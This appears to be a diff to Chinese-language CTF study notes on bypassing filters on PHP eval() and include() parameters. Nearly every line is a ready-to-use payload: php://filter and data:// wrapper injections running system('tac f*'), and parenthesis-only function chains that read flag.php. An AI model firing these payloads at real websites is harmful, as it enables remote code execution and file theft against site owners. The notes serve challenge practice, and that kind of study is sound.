@@ -24,20 +24,25 @@
 
 <br>
 
-* 文件包含漏洞--命令绕过
+* --命令绕过
 
 
 <br>
 
-直接传参时
-
+直接eval()传参时：
+* 特殊字符:"$""&"如果只是对c进行过滤，就可以通过包含另一个函数来绕过
+* 做题前先看看对谁过滤，再看如何过滤
 * c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
 * c=include$_GET[1]?>&1=data://text/plain,<?php system("nl flag.php")?>
 * c=$nice=include$_GET["url"]?>&url=php://filter/read=convert.base64-encode/resource=flag.php
+* 仅括号
+* c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));
+* c=eval(next(reset(get_defined_vars())));&1=;system("tac%20flag.php");
+* c=show_source(next(array_reverse(scandir(pos(localeconv())))));
 
 <br>
 
-当include(c)时：
+当include(c)时：直接使用协议绕过
 * c=data://text/plain,<?php system('tac f*');?>
 
 <br>
